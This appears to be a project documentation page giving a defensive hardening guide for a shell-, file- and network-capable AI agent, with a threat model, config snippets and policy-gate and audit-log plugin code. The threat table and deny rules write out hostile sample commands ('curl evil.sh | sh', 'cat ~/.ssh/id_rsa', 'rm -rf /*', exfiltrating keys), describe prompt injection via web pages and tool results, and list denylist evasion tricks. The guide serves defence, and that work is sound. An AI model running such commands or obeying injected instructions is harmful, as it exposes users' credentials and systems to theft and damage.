# Hardening the autonomous agent (bash + file + network)

A practical, prioritized hardening guide for an autonomous agent that can run a
**shell**, **read/write files**, and **reach the network**. It is the *action*
companion to [`security-sandboxing.md`](security-sandboxing.md): that document is
the honest reference — what hermes-agent offers today, why in-process checks stop
*accidents* but only the OS stops *adversaries*, and the full capability table.
**This** document is the checklist and the drop-in code: the threat model in one
screen, the concrete controls in the order you should apply them, copy-pasteable
plugin skeletons, and a POC-honest roadmap of *now vs. later*.

> **Read these together.** If you only read one, read
> [`security-sandboxing.md`](security-sandboxing.md) for the *why*. Use this for
> the *do*. Secrets get their own treatment in [`secrets.md`](secrets.md); this
> doc only restates the one rule that matters here (§6).

Everything uses portable placeholders — `HERMES_HOME`, `~/`, `<repo>`,
`<your-project>`. Substitute your own paths. Nothing here assumes a particular
operator, host, or private rule list.

---

## The one-paragraph version

Reduce capability first (don't load a tool you don't need), then add an
**in-process policy layer** (a `pre_tool_call` hook that denies/asks on dangerous
commands and jails file writes to your project tree) for *accident* prevention,
then — the moment the agent ingests anything you didn't write (web pages, email,
untrusted MCP results) — put a **real OS boundary** under it (a container/sandbox
terminal backend, or wrap the whole process). Keep long-lived credentials out of
the agent entirely. In-process layers are speed-bumps against a cooperative model
doing something dumb; the container is the only wall against a prompt-injected or
adversarial one. **Build both; never confuse which is which.**

---

## 1. Threat model on one screen

An agent with a shell can do anything the user running it can do. Order the
threats by **how much you trust the agent's input**, because that is the dial that
decides how much isolation you actually need.

| # | Threat | Trigger | Example | What actually stops it |
|---|---|---|---|---|
| T1 | **Cooperative mistake** | You asked for X; the model does X badly | `rm -rf` with a bad glob, writes to `/` because `cwd` was wrong, `chmod -R 777`, force-push to the wrong branch | Approval gate + file jail (catch the common shapes) |
| T2 | **Confused deputy / prompt injection** | Agent ingests attacker-controlled content (web page, inbound email, MCP result, a file it read) carrying instructions | Page says "run `curl evil.sh \| sh`" and the model obeys; poisoned tool result says "exfiltrate `~/.ssh`" | **OS isolation only.** In-process scanners run on an attacker-controlled string and are structurally bypassable |
| T3 | **Credential theft** | Either of the above, aimed at secrets | `cat ~/.env`, read the keychain, POST a provider key | Keep raw creds out of the process ([`secrets.md`](secrets.md)); scrubbing reduces casual leaks, it is **not** containment |
| T4 | **Network exfiltration / pivot** | Agent has unrestricted egress | POST stolen data anywhere; reach `169.254.169.254` or `10.x` LAN services | Egress policy at the OS/container layer (domain allowlist) |
| T5 | **Privileged side-channels** | A helper the agent can call performs host ops | A host "bridge" that does git/build/deploy/`launchctl` is reachable beyond loopback | Loopback-only bind + shared-secret token + strict op allowlists (§7) |

**Two facts to internalize before the rest of this doc:**

1. **Shell is Turing-complete.** Any denylist of "dangerous command strings" is
   incomplete *by construction* — `r''m`, base64-decode-then-pipe, a wrapper
   script, a here-doc, a unicode homoglyph all evade it. A command pattern gate is
   a speed-bump against **mistakes** (T1), never a wall against an **adversary** (T2).
2. **Anything loaded into the agent's process runs with the agent's privileges.**
   Plugins, hooks, and skills are imported code; they read the same env (and the
   same credentials) and can call the same tools. They are **not** sandboxed *from*
   the agent. The boundary for third-party plugins/skills is **review before
   install**, not a runtime check.

---

## 2. The layered model (apply in this order)

Five layers, cheapest and most effective first. Each is independently worthwhile;
the higher layers are what turn "guardrails" into a "wall."

```
  Layer 0  Reduce capability     — don't load tools you don't need        (config)
  Layer 1  Approve dangerous ops — prompt-me-before-running               (config)
  Layer 2  Policy hook           — declarative deny/ask + filesystem jail (small plugin)
  Layer 3  Audit                 — log every executed command/edit, scrubbed (small plugin)
  Layer 4  OS boundary           — container/sandbox backend, or wrap the whole process
─────────────────────────────────────────────────────────────────────────────────────
  Layers 0–3 stop ACCIDENTS (T1, partial T3/T4).  Layer 4 stops ADVERSARIES (T2, T4).
```

The decision rule for *how far up* you must go is **input trust**:

- **Trusted operator, no untrusted input** (you type the prompts; the agent only
  touches your code): Layers 0–3 are a reasonable posture. You are defending
  against your own model's clumsiness.
- **The agent reads the open web / email / a shared channel / untrusted MCP
  servers:** you have crossed into T2 — **Layer 4 is mandatory.** No amount of
  in-process cleverness substitutes for it.

---

## 3. Limiting BASH

Four techniques, weakest-but-easiest to strongest. Stack them.

### 3a. Remove the tool entirely (Layer 0 — strongest *reduction*)

The cleanest way to remove a capability is to not load it. hermes-agent gates
tools **per surface** (the CLI and a messaging channel can expose different sets),
so a surface with no `terminal` tool simply cannot run a shell:

```yaml
platform_toolsets:
  cli:
    - file
    - memory
    - web
    # - terminal        ← omit ⇒ NO shell on this surface
    # - code_execution  ← omit ⇒ NO Python-exec tool either
```

```bash
hermes tools list                 # what's enabled per surface
hermes tools disable terminal     # drop a toolset (or an MCP tool: server:tool)
```

This is genuinely effective — but **all-or-nothing per tool**. "Shell, but only
inside `<repo>`" or "shell, but not `curl`" is *not* expressible here; that is what
3b–3d add. (See [`security-sandboxing.md` §2.2](security-sandboxing.md) for the
full toolset reference.)

### 3b. Approve dangerous commands (Layer 1)

Built-in approval gate: detect common destructive shapes and **prompt the operator
before running them**.

```yaml
approvals:
  mode: manual            # prompt before a flagged command
  timeout: 60             # seconds to wait for a decision
  cron_mode: deny         # unattended jobs REFUSE a flagged command (never auto-run)
  destructive_slash_confirm: true
command_allowlist: []     # commands you have permanently approved (skips the prompt)
```

Honesty flags — treat these as "approval is OFF":

- A **`--yolo`** / `HERMES_YOLO_MODE` switch disables the gate entirely.
- **`-z/--oneshot`** auto-bypasses approvals (meant for non-interactive pipes) — do
  not pipe untrusted prompts into it on the `local` backend.
- **Unattended contexts can't show a prompt** — that's why `cron_mode: deny`
  exists. An unattended job should *refuse* a flagged command, not silently run it.

The gate catches **shapes it knows**. It is a T1 control, not a T2 one.

### 3b′. The built-in content scanner (a real, shipped control)

hermes-agent ships a **pre-exec command scanner** (the `tirith` binary, run as a
subprocess before each terminal command) that inspects the command *content* for
threats a simple pattern list misses — homograph/punycode URLs, pipe-to-interpreter
(`… | sh`), terminal-injection escape sequences, and similar. The **exit code is the
verdict** (`0` allow / `1` block / `2` warn); JSON stdout only enriches the finding.

```yaml
security:
  tirith_enabled: true     # on by default where the platform is supported
  tirith_timeout: 5        # seconds; the scan is bounded
  tirith_fail_open: true   # spawn error/timeout/unknown verdict ⇒ ALLOW (see note)
```

It auto-installs from its pinned GitHub release with **SHA-256** (and, when `cosign`
is present, **provenance**) verification, in a background thread so startup never
blocks. If it is enabled but unavailable, the agent falls back to **pattern matching
only** and says so.

Why it matters, and its honest limits:

- It is the one built-in that actively targets the **T2 (injection)** vector rather
  than only T1 — useful, and worth leaving **on**.
- But it is still a **string scanner running in-process**; like any content check it
  is a speed-bump a determined adversary can shape around (it doesn't see what a
  fetched script actually *does* once executed). Keep it on the accident/speed-bump
  side of the ledger — it **raises the bar**, it is not the sandbox (Layer 4).
- **`tirith_fail_open: true` is a security/availability trade-off.** A scan timeout
  or a missing binary lets the command through. To make scanning a hard precondition
  (refuse a command the scanner couldn't vet), set `tirith_fail_open: false` — and
  accept that scanner downtime then blocks work.

### 3c. Declarative deny/ask policy (Layer 2 — the portable pattern)

Out of the box in non-interactive CLI mode, the agent is **allow-everything**
beyond the approval gate. To get a finer, *reviewable* deny/ask policy — the
equivalent of Claude Code's `settings.json` `permissions` — register a
**`pre_tool_call` hook** that maps declarative rules onto the concrete tool +
argument and **blocks** on a match. This is the proven pattern; the mechanics, not
anyone's private rule list, are the point. A working skeleton is in §5.

Rule → tool mapping (the translation that makes a familiar `permissions` block
enforceable):

| Declarative rule | Concrete tool (argument checked) |
|---|---|
| `Bash(<glob>)` | `terminal` (`command`) |
| `Write/Edit(<glob>)` | `write_file` / `edit_file` (`path`) |
| `Read(<glob>)` | `read_file` (`path`) |

Two design choices that keep it honest:

- **`deny` = hard block. `ask` = hard block with "a human must do this."** A
  non-interactive CLI has no one to prompt, so `ask` means *never autonomously* —
  keep it distinct from the interactive approval gate (3b), which is
  *prompt-me-then-maybe*.
- **Fail-open on the *plugin*, fail-closed on the *rule*.** A malformed policy file
  must never wedge every tool call; but a command/path that *matches* a deny rule
  must be blocked.

> **The load-bearing caveat (don't skip).** This hook runs **inside** the agent
> process. It is excellent at stopping the model from *cooperatively* doing
> something dumb (T1). It does **not** contain a prompt-injected or adversarial
> model (T2) — both run with full privileges and can route around an in-process
> check. It is a guardrail, not a jail. The jail is Layer 4 (§7 of
> [`security-sandboxing.md`](security-sandboxing.md)).

### 3d. Sandboxed terminal backend (Layer 4 — the real wall)

The single most important setting. The `terminal` tool (and the file tools, which
sit on the same shell contract) execute against a **pluggable backend**:

```yaml
terminal:
  backend: local        # ← runs DIRECTLY on the host. No isolation. Full trust envelope.
  timeout: 180
```

| `backend` | Where commands run | Isolation |
|---|---|---|
| `local` (default) | Your host, your user | **None** |
| `ssh` | A remote server | The remote host is the blast radius |
| `docker` | An isolated container | Filesystem/network confined to the container |
| `singularity` / Apptainer, `modal`, `daytona` | HPC / cloud sandbox | Confined VM/container |

For the `docker` backend the security-relevant defaults are the safe ones —
**verify them in your build before relying on them**, and keep them:

```yaml
terminal:
  backend: docker
  # Pin to a digest-tagged image for reproducibility.
  # python:3.12-slim is a suitable general-purpose starting point.
  docker_image: python:3.12-slim
  # Mount only the workspace (cwd at launch). Don't expose more of the
  # filesystem than the agent's task requires.
  docker_mount_cwd_to_workspace: true
  # CRITICAL: keep this empty. It prevents ALL host env vars — including the
  # inference key (LLM_API_KEY / ANTHROPIC_API_KEY / …) injected at launch —
  # from flowing into the container shell. See §6 and secrets.md for the
  # three-tier model. To forward one task-scoped secret explicitly:
  #   docker_forward_env: [MY_DEPLOY_TOKEN]
  # Prefer the broker (host-bridge) pattern over forwarding any secret at all.
  docker_forward_env: []
  docker_run_as_host_user: false         # container runs as its own non-root user
  container_memory: 5120                 # MB resource caps
  container_disk: 51200
```

> Switching `backend` from `local` to a container is the one change that turns
> "the agent can do anything I can" into "the agent can do anything *inside this
> box*." Everything in 3a–3c is accident-prevention layered on top.

#### The docker-when-untrusted default

The safe default posture is: **`backend: local` while you are the only source
of prompts; switch to `backend: docker` the moment the agent can ingest content
you did not write** (web pages, inbound messages, untrusted MCP results). This
is the _docker-when-untrusted_ default and the recommended starting posture.
See `config/config.yaml.example` for the commented-out drop-in block and
`docs/secrets.md` for the tiered secrets model that pairs with it.

---

## 4. Limiting FILE read/write

The agent's file tools (`write_file`/`edit_file`/`patch`, and `read_file`) need
their own boundary — and there is an important asymmetry between them.

### 4a. The filesystem jail (allowed-roots) — for WRITES

hermes-agent has no built-in "the agent may only write under these directories"
control. Add one in the same `pre_tool_call` plugin (§5): an **allowed-roots**
check scoped to the *write* tools. Keep the policy in a familiar shape:

```jsonc
{
  "permissions": { "deny": [ "Bash(*<sensitive-file-glob>*)" ], "ask": [] },

  "fsjail": {
    "mode": "enforce",                 // "warn" = log-only dry-run; "enforce" = block
    "allowedRoots": [
      "~/<your-project>",              // your project tree
      "/tmp", "/private/tmp",          // scratch
      "/var/folders", "/private/var/folders"
    ],
    "denyOutsideRoots": true,
    "scopedTools": ["write_file", "edit_file", "patch"]
  }
}
```

Four rules make the check **correct** (these are exactly what the reference
implementation does):

1. **Resolve the real path.** `expanduser` + `realpath` the tool's `path` arg so
   `../` and symlinks can't escape — compare the *resolved* absolute path against
   the *resolved* roots.
2. **Only check absolute paths.** If the path is relative, the hook doesn't know
   the `cwd` → **skip** the check (fail-open) rather than guess. This is a real
   gap; close it with Layer 4.
3. **Outside every root ⇒ violation.** `enforce` → block; `warn` → append to a
   gitignored `<repo>/logs/scope-violations.log` and allow. *Always run `warn`
   first* to tune your roots against a real session, then flip to `enforce`.
4. **Scope it to write tools.** It's writes/patches escaping the tree that hurt.

### 4b. Reads are different — and the jail leaks on `local`

You *can* add `read_file` to `scopedTools` to stop the agent reading outside the
tree — but understand the leak: on the `local` backend the **`terminal` tool can
still `cat ~/.ssh/id_rsa`**, because that's a shell command, not a `read_file`
call. A read-jail that only covers `read_file` is mostly theatre while a local
shell exists.

Practical consequences:

- **For write protection,** the fsjail (4a) is a strong *accident* preventer and a
  clean way to encode intent. Use it.
- **For read protection of genuinely sensitive paths** (`~/.ssh`, `/etc`, secret
  stores, browser cookie DBs), the in-process options are (i) a `read_file` scope
  and (ii) `terminal` command **deny** rules for the obvious shapes — both
  bypassable in principle. The *real* read boundary is **Layer 4**: a container
  whose mounts simply don't include those paths. Don't mount what the agent must
  not read.

> **The honest conclusion (same as the sandboxing doc).** The plugin jail and the
> container are complementary: the plugin gives you ergonomic, hot-editable intent
> (and covers the file tools); the container gives you the wall the **shell** also
> can't cross. For a *real* filesystem boundary, the backend must be the boundary.

---

## 5. Drop-in plugin skeletons

These are **generic, reviewable** skeletons that implement Layers 2–3. They are
illustrative — read them, adapt the policy to your needs, run the self-test, then
install. They depend only on the hook lifecycle (`pre_tool_call` /
`post_tool_call`) and the Python stdlib.

> A plugin is **trusted code running in the agent's process** (see fact #2 in §1).
> Review every line before you load it. These skeletons are written to be short
> enough to audit in full.

### 5a. Policy gate + filesystem jail (`pre_tool_call`)

```python
# plugins/policy-gate/__init__.py — illustrative; adapt + self-test before installing.
#
# Implements two checks on every tool call, BEFORE it runs:
#   1) declarative deny/ask rules (Claude-Code permissions syntax) on bash/file tools
#   2) a filesystem "allowed-roots" jail on the file-WRITE tools
# Policy is read from a JSON file in the familiar {permissions, fsjail} shape and
# mtime-cached so edits take effect mid-session without a restart.
#
# HONESTY: this runs in-process. It stops a COOPERATIVE model (T1), not an
# adversarial/prompt-injected one (T2). Fail-OPEN on load errors (never wedge the
# agent); fail-CLOSED on a matched rule (a matched deny must block).

import fnmatch, json, os, re
from datetime import datetime
from pathlib import Path

POLICY_PATH = os.environ.get(
    "AGENT_POLICY_FILE", os.path.expanduser("~/<your-project>/policy.json")
)

# tool name -> (declarative rule prefixes to check, the arg holding the target string)
_TOOL_MAP = {
    "terminal":   (("Bash",),          "command"),
    "write_file": (("Write", "Edit"),  "path"),
    "edit_file":  (("Write", "Edit"),  "path"),
    "read_file":  (("Read",),          "path"),
}
_CACHE = {"mtime": None, "rules": {"deny": [], "ask": []}, "jail": None}


def _mtime(p):
    try: return os.stat(p).st_mtime
    except OSError: return -1.0


def _load():
    """Return (rules, jail), cached by policy-file mtime. Fail-open on any error."""
    m = _mtime(POLICY_PATH)
    if m == _CACHE["mtime"]:
        return _CACHE["rules"], _CACHE["jail"]
    rules, jail = {"deny": [], "ask": []}, None
    try:
        doc = json.load(open(POLICY_PATH)) or {}
        for kind in ("deny", "ask"):
            for entry in (doc.get("permissions", {}) or {}).get(kind, []) or []:
                mt = re.match(r"^([A-Za-z_]+)\((.*)\)$", str(entry).strip())
                if mt:
                    rules[kind].append((mt.group(1), mt.group(2)))
        fj = doc.get("fsjail") or {}
        if fj.get("allowedRoots"):
            roots = []
            for r in fj["allowedRoots"]:
                try: roots.append(os.path.realpath(os.path.expanduser(str(r))))
                except Exception: pass
            jail = {
                "mode": (fj.get("mode") or "warn").lower(),
                "roots": roots,
                "deny_outside": bool(fj.get("denyOutsideRoots", True)),
                "tools": set(fj.get("scopedTools") or ["write_file", "edit_file", "patch"]),
            }
    except Exception:
        pass  # fail-open: a broken policy file must never block every tool call
    _CACHE.update(mtime=m, rules=rules, jail=jail)
    return rules, jail


def _matches(pattern, target):
    p = pattern[1:] if pattern.startswith("//") else pattern  # //abs -> /abs
    if fnmatch.fnmatch(target, p):
        return True
    # bare token (no wildcard/slash) -> substring match (loose Bash()-style rule)
    return "*" not in p and "/" not in p and p in target


def _abs(path):
    """Absolute realpath, or None for a relative path (cwd unknown -> skip = fail-open)."""
    if not isinstance(path, str) or not path: return None
    p = os.path.expanduser(path)
    if not os.path.isabs(p): return None
    try: return os.path.realpath(p)
    except Exception: return None


def _in_roots(ap, roots):
    return any(ap == r or ap.startswith(r.rstrip("/") + "/") for r in roots)


def _log_violation(tool, path, mode):
    try:
        d = Path(os.path.expanduser("~/<your-project>/logs")); d.mkdir(parents=True, exist_ok=True)
        verb = "BLOCKED" if mode == "enforce" else "WOULD-BLOCK"
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        (d / "scope-violations.log").open("a", encoding="utf-8").write(
            f"[{ts}] [{mode}] [{verb}] [{tool}] OUTSIDE-ROOTS {path}\n")
    except Exception:
        pass


def _on_pre_tool_call(tool_name=None, args=None, **kwargs):
    rules, jail = _load()
    args = args or {}

    # 1) deny / ask rules
    mapping = _TOOL_MAP.get(tool_name)
    if mapping:
        prefixes, arg_key = mapping
        target = args.get(arg_key)
        if isinstance(target, str) and target:
            for kind in ("deny", "ask"):
                for prefix, pattern in rules[kind]:
                    if prefix in prefixes and _matches(pattern, target):
                        why = "denied" if kind == "deny" else "requires a human"
                        return {"action": "block",
                                "message": f"[policy-gate] {tool_name} {why} by policy "
                                           f"— matched {prefix}({pattern}). NOT run."}

    # 2) filesystem jail on write tools
    if jail and jail["deny_outside"] and tool_name in jail["tools"]:
        ap = _abs(args.get("path"))
        if ap is not None and not _in_roots(ap, jail["roots"]):
            path = args.get("path")
            if jail["mode"] == "enforce":
                return {"action": "block",
                        "message": f"[policy-gate] {tool_name} blocked — {path} is outside "
                                   f"the allowed roots. Work inside the project, or a human must."}
            _log_violation(tool_name, path, jail["mode"])
    return None  # allow


def register(ctx) -> None:
    ctx.register_hook("pre_tool_call", _on_pre_tool_call)
```

The accompanying `policy.json` is the reviewable artifact (start in `warn`,
tune roots against a real session, then flip to `enforce`):

```jsonc
{
  "permissions": {
    "deny": [
      "Bash(*<sensitive-db-or-cookie-file>*)",   // shapes with no legitimate agent use
      "Bash(rm -rf /*)"
    ],
    "ask": [ "Bash(<deploy-or-irreversible-op>*)" ]   // == "never autonomously"
  },
  "fsjail": {
    "mode": "warn",
    "allowedRoots": ["~/<your-project>", "/tmp", "/private/tmp", "/var/folders"],
    "denyOutsideRoots": true,
    "scopedTools": ["write_file", "edit_file", "patch"]
  }
}
```

### 5b. Audit log with secret scrubbing (`post_tool_call`)

hermes-agent keeps no per-command audit trail. A `post_tool_call` hook gives you
one. It is **observational only** — it never blocks (gating is 5a's job;
`post_tool_call` fires *after* execution, so anything logged here actually ran).
The non-negotiable: **scrub secrets before writing** — an audit log that records a
leaked credential is its own breach.

```python
# plugins/audit-log/__init__.py — illustrative; observational only, fail-open, scrubs secrets.

import json, os, re
from datetime import datetime
from pathlib import Path

LOG_DIR = Path(os.environ.get("AGENT_LOG_DIR", os.path.expanduser("~/<your-project>/logs")))
_TERMINAL = {"terminal"}
_EDITS = {"write_file": "path", "edit_file": "path", "patch": "path"}

# --- secret scrubbing: redact credentials before they ever hit disk ---
_SECRET_ENV_HINTS = ("KEY", "TOKEN", "SECRET", "PASSWORD", "PASSWD", "CREDENTIAL")
_CRED_KV = re.compile(
    r"(?i)(\b(?:password|passwd|pwd|secret|token|api[_-]?key|access[_-]?key|"
    r"auth[_-]?token|client[_-]?secret)\b\s*[:=]\s*)(\"[^\"]*\"|'[^']*'|\S+)")
_FLAG   = re.compile(r"(?i)(--?(?:password|passwd|token|api[-_]?key|secret)[= ])(\S+)")
_AUTH   = re.compile(r"(?i)(authorization:\s*(?:bearer|basic)\s+)(\S+)")
_AWS    = re.compile(r"\bAKIA[0-9A-Z]{16}\b")
_URLCRD = re.compile(r"([a-zA-Z][a-zA-Z0-9+.\-]*://[^\s:/@]+:)([^\s/@]+)(@)")
_PEM    = re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")


def _env_secret_values():
    vals = [v for k, v in os.environ.items()
            if v and len(v) >= 6 and any(h in k.upper() for h in _SECRET_ENV_HINTS)]
    return sorted(set(vals), key=len, reverse=True)  # longest first


def _scrub(text):
    if not isinstance(text, str) or not text: return text
    s = text
    for v in _env_secret_values():
        if v in s: s = s.replace(v, "[REDACTED:env-secret]")
    s = _CRED_KV.sub(lambda m: m.group(1) + "[REDACTED]", s)
    s = _FLAG.sub(lambda m: m.group(1) + "[REDACTED]", s)
    s = _AUTH.sub(lambda m: m.group(1) + "[REDACTED]", s)
    s = _AWS.sub("[REDACTED:aws-key]", s)
    s = _URLCRD.sub(lambda m: m.group(1) + "[REDACTED]" + m.group(3), s)
    s = _PEM.sub("[REDACTED:private-key]", s)
    return s


def _append(name, line):
    try:
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        (LOG_DIR / name).open("a", encoding="utf-8").write(line + "\n")
    except Exception:
        pass


def _exit_code(result):
    try: obj = json.loads(result) if isinstance(result, str) else None
    except Exception: return None
    if isinstance(obj, dict):
        for k in ("exit_code", "returncode", "return_code", "code", "status"):
            v = obj.get(k)
            if isinstance(v, int) and not isinstance(v, bool): return v
    return None


def _on_post_tool_call(tool_name=None, args=None, result=None, session_id=None,
                       duration_ms=None, **kwargs):
    try:
        args = args or {}
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        sid = (session_id or "--------")[-12:]
        dur = f"{int(duration_ms)}ms" if isinstance(duration_ms, (int, float)) else "-"
        if tool_name in _TERMINAL:
            cmd = args.get("command")
            if isinstance(cmd, str) and cmd.strip():
                rc = _exit_code(result)
                cmd1 = _scrub(cmd).replace("\r", "").replace("\n", "\\n")
                _append("bash-commands.log",
                        f"[{ts}] [{sid}] [EXECUTED] [{dur}] [exit={rc if rc is not None else '?'}] {cmd1}")
        elif tool_name in _EDITS:
            path = args.get(_EDITS[tool_name])
            if isinstance(path, str) and path:
                _append("file-edits.log", f"[{ts}] [{sid}] [{tool_name}] {_scrub(path)}")
    except Exception:
        pass  # never let logging break a tool call
    return None


def register(ctx) -> None:
    ctx.register_hook("post_tool_call", _on_post_tool_call)
```

> **Steering ≠ enforcing.** There is a softer, related hook (`pre_llm_call`) that
> can *inject context* into a turn to nudge tool discipline ("make the HTTP call
> yourself; don't ask the user to paste curl"). That shapes behaviour but a model
> can ignore it — it is ergonomics for weaker local models, **never** a control.
> Keep it mentally on the *steering* side, separate from the *enforcing* hooks above.

---

## 6. Secrets isolation — the tiered model (full story in `secrets.md`)

The agent should **never read long-lived credentials.** The threat is T3 (§1):
a prompt-injected command that reads `env` and exfiltrates the key. The defense
is a three-tier model, ordered by what is achievable today vs. roadmap:

### Tier 1 — Inference key (in-process, not in sandbox)

The inference key (`LLM_API_KEY`, `ANTHROPIC_API_KEY`, …) is injected into the
**hermes-agent process** at launch by `seckit run` / `op run` — and kept there.
`docker_forward_env: []` (the default) ensures it never flows into the bash
sandbox: the container shell cannot read `env` and find it.

```yaml
# config/config.yaml.example — secure posture block
terminal:
  backend: docker
  docker_forward_env: []   # inference key stays in process; empty = nothing forwarded
```

This is an **accident-prevention** control (it stops a cooperative model from
casually leaking the key via `echo $LLM_API_KEY`). A prompt-injected model
could still call inference directly via the agent's own tools. The next tier
closes that gap.

### Tier 2 — Task secrets (broker or scoped forward)

Some tasks require a credential the agent needs at execution time — a HASS token
for a Home Assistant call, a read-only deploy token for `git push`. Two patterns:

**Preferred — the broker (host-bridge):** the host-side bridge (§7) holds the
credential and performs the privileged action on behalf of the agent. The agent
sends a named operation (`{"op": "hass.check_entities"}`); the bridge authenticates
and executes it. The agent **never holds the token**. This is the recommended
pattern for any task secret.

**Fallback — scoped forward:** if a broker is impractical, add exactly one name to
`docker_forward_env`:

```yaml
terminal:
  backend: docker
  docker_forward_env: [HASS_TOKEN]   # one secret, task-scoped, narrowest possible
```

Never forward more names than the task strictly requires. Prefer revocable,
read-only tokens over long-lived admin keys. Rotate after use.

### Tier 3 — Gold standard: egress proxy (roadmap)

The only way to make "the agent literally cannot hold the API key" true is an
**egress proxy / sidecar**: Hermes points at `http://127.0.0.1:<PORT>` instead
of the provider; the proxy holds the credential and attaches the auth header on
each outbound call. The agent — and the sandbox — only ever see the loopback URL.

This is a documented future direction, not a config flag in this scaffold. See
[`secrets.md` — Honest framing & roadmap](secrets.md#honest-framing--roadmap)
for the fuller picture, including Vault Agent as the heavier managed variant.

**The honest limit of Tiers 1–2:** the agent process holds the inference key
(Tier 1 only keeps it out of the sandbox; Tier 2 brokers task secrets for that
scope). Anything loaded into the process (a plugin, a skill) can still read it.
The egress proxy (Tier 3) is the only full containment.

**Today's rules:** keys in keychain/vault, never in config, never committed;
`docker_forward_env: []` by default; forward one task secret at a time only via
the broker pattern or explicit scoped forward; run the agent as a **non-root**
user. See [`secrets.md`](secrets.md) for the full three-tier guide.

---

## 7. Privileged helpers (the host-bridge pattern)

Some host operations are structurally impossible from inside a sandbox — git auth
with the host's SSH agent, `launchctl`/service lifecycle, host-log access. A common
pattern is a small **host-side bridge** (an HTTP service the agent calls) that
performs exactly those ops. A bridge is a *deliberate hole* in your sandbox, so it
must be the **narrowest possible** hole:

- **Loopback only by default.** Bind `127.0.0.1`. Binding `0.0.0.0` (e.g. so
  containers can reach it via `host.docker.internal`) **also exposes it to your
  LAN** — privileged host ops, on the network. Only do this behind a trusted
  boundary, with a host firewall rule scoped to the container subnet.
- **Shared-secret auth when not pure-loopback.** Require a token header
  (`hmac.compare_digest`, not `==`) on every non-health endpoint.
- **Allowlist every operation, no free-form input.** Restart only labels on an
  exact-match allowlist (no glob/prefix). Read logs only via a short-name →
  absolute-path allowlist (a path-traversal guard — never accept an arbitrary
  path). Run subprocesses with `shell=False` and an argument **list**, never a
  shell string.
- **Bounded + observable.** Per-operation timeouts; cap captured output; log every
  request and every rejected (out-of-allowlist) attempt.

The bridge's allowlists are themselves a security control — keep them tight and
review additions. (See [`SECURITY.md`](../SECURITY.md) network-exposure notes and
[`docs/architecture/topologies.md`](architecture/topologies.md) for where the
bridge sits in each topology.)

---

## 8. Lockdown / break-glass flags

When you suspect a plugin, skill, or instruction file is steering the agent, boot a
minimal one:

| Flag | Effect | When |
|---|---|---|
| `--safe-mode` | Disable **all** customization: user config, memory/rules injection, plugins, MCP | Triage a misbehaving plugin/skill |
| `--ignore-user-config` | Ignore `config.yaml`, fall back to built-in defaults (`.env` creds still load) | Bypass a config you don't trust |
| `--ignore-rules` | Skip auto-injection of memory / rule files (AGENTS.md / SOUL.md / `.cursorrules`) | Stop untrusted instruction files steering the agent |
| `--worktree` | Run inside an isolated git worktree | Limit accidental edits to a throwaway checkout (blast-radius reduction, *not* a boundary) |

(These are real upstream hermes-agent flags; `--safe-mode` implies the other two.
Confirm exact names against your installed version — see
[`security-sandboxing.md` §2.5](security-sandboxing.md).)

---

## 9. Prioritized roadmap — now vs. later (POC-honest)

What's achievable **today** with config + a small plugin, what needs a
**container/proxy**, and what's a genuine **roadmap** item. Be explicit with
yourself about which column a control is in — that is the whole discipline.

| Goal | Status | How | Stops |
|---|---|---|---|
| Remove a capability (no shell / no code-exec on a surface) | ✅ Today | `platform_toolsets` / `hermes tools disable` (§3a) | reduces T1–T4 surface |
| Prompt before common destructive commands | ✅ Today | `approvals.mode: manual` (§3b) | T1 |
| Content-scan each command (homograph URLs, pipe-to-interpreter, term-injection) | ✅ Today, built-in | `security.tirith_enabled` scanner (§3b′) — *raises the bar on T2, still a string check* | partial T2 |
| Declarative deny/ask command + path policy | ✅ Today, DIY | `pre_tool_call` policy gate (§3c, §5a) | T1 |
| "Agent may only **write** under `<roots>`" | ✅ Today, DIY | fsjail in the plugin (§4a, §5a) — **file tools, not shell** | T1 |
| Per-command audit log, secrets scrubbed | ✅ Today, DIY | `post_tool_call` audit (§5b) | detection/forensics |
| Block fetching internal/private URLs | ✅ Today | `security.allow_private_urls: false` ([sandboxing §2.4](security-sandboxing.md)) | partial T4 |
| Narrow a privileged host helper | ✅ Today | loopback + token + op allowlists (§7) | T5 |
| Real FS boundary the **shell** also can't cross | 🐳 Needs container | `terminal.backend: docker/…` (§3d) | T1 + read-side T3 |
| Confine code-exec / MCP / plugin code paths too | 🐳 Needs whole-process wrap | run the agent in its own container (§ below) | T2 (the only thing that does) |
| Restrict network egress to an allowlist | 🐳 Needs container/sandbox | container network policy / L7 egress | T4 |
| Agent **never** holds the raw API key | 🛣️ Roadmap | egress proxy / boundary injection (§6, [`secrets.md`](secrets.md)) | T3 |
| Per-tool "shell but not `curl`" an adversary can't bypass | 🛣️ Not solvable in-process | shell is Turing-complete — only a sandbox is sound | T2 |

### Whole-process wrapping (when input is untrusted)

A sandboxed *terminal backend* (§3d) confines what the agent does **through the
shell**. It does **not** confine what the agent does in its **own process** —
code-execution, MCP subprocesses, plugin/skill/hook code. The moment the agent
ingests genuinely untrusted content (the open web, inbound email, multi-user
channels, untrusted MCP servers), wrap the **entire** process tree:

- **Run the whole agent inside its own container** (the project ships a Docker /
  Compose setup) with operator-chosen mounts and a restrictive network policy.
  *Every* code path is then subject to the same filesystem/network policy.
- **Per-session sandbox frameworks** (e.g. NVIDIA OpenShell-style) add declarative
  filesystem + L7 egress + syscall policy per session, with **credentials injected
  from a provider store that never touches the sandbox filesystem** — the §6
  egress-proxy idea, productized.

### The three rules to repeat to yourself

1. **In-process = accidents. OS = adversaries.** The approval gate, the policy
   plugin, and the fsjail stop the model from *cooperatively* doing harm (T1). The
   container/sandbox is the only thing that stops a *prompt-injected* model (T2).
   Ship both; never confuse them.
2. **Shell beats denylists.** Any "dangerous command" pattern list is incomplete by
   construction — a speed-bump against mistakes, worthless as a wall.
3. **The process holds the keys.** Until an egress proxy or sandbox provider store
   sits in front of inference, the launched agent — and anything loaded into it —
   can read the credentials in its environment. Plugins and skills are trusted
   code: **review before install.**

---

## 10. Recommended starting postures

- **Local-only, trusted operator, no untrusted input** — `backend: local` +
  `approvals.mode: manual` + the §5a policy gate in `enforce` + the §4a fsjail in
  `enforce` + secrets via keychain/vault (§6) + non-root user + the §5b audit log.
  *Good against mistakes (T1). Not a defense against T2.*
- **You let it touch the open web / email / untrusted MCP** — move to
  `terminal.backend: docker` (or wrap the whole process) with
  `docker_mount_cwd_to_workspace` and `docker_forward_env` minimal. *Now you have a
